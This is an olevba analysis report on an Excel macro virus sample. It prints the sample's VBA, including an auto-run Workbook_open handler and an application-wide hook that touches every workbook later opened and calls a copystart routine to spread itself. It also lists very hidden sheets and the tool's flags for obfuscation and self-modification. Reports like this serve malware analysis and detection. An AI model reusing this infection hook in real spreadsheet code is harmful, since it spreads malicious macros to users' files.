olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents xx As Application
Attribute xx.VB_VarHelpID = -1
Private Sub Workbook_open()
Set xx = Application
On Error Resume Next
Application.DisplayAlerts = False
Call do_what
End Sub
Private Sub xx_workbookOpen(ByVal wb As Workbook)
On Error Resume Next
wb.VBProject.References.AddFromGuid _
GUID:="{0002E157-0000-0000-C000-000000000046}", _
Major:=5, Minor:=3
Application.ScreenUpdating = False
Application.DisplayAlerts = False
copystart wb
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet17.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet18.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet19.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet19'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet20.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet20'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet21.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet22.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet23.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet24.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet24'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet26.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet25.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet25'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet27.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet27'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet28.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet28'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet29.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet30.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet30'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet31.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet31'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet32.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet33.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet34.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet35.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet35'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet36.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet37.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet38.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet38'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet39.cls 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToDOLE.bas 
in file: Virus.MSExcel.Agent.f-d8370f53e9f36aff879d02ddbb1d9a40f296a286 - OLE stream: '_VBA_PROJECT_CUR/VBA/ToDOLE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - R—^^?
' 0085     30 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - Ïkåeù[^Gl
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - \x08gÓ~FU:W
' 0085     28 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - Ïkåe •.U
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - \x08gÓ~FU
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - Ïkåeù[
' 0085     30 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - Ïk\x08g •.UGl
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - Ïk\x08g •.U
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  1
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  3
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  3
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

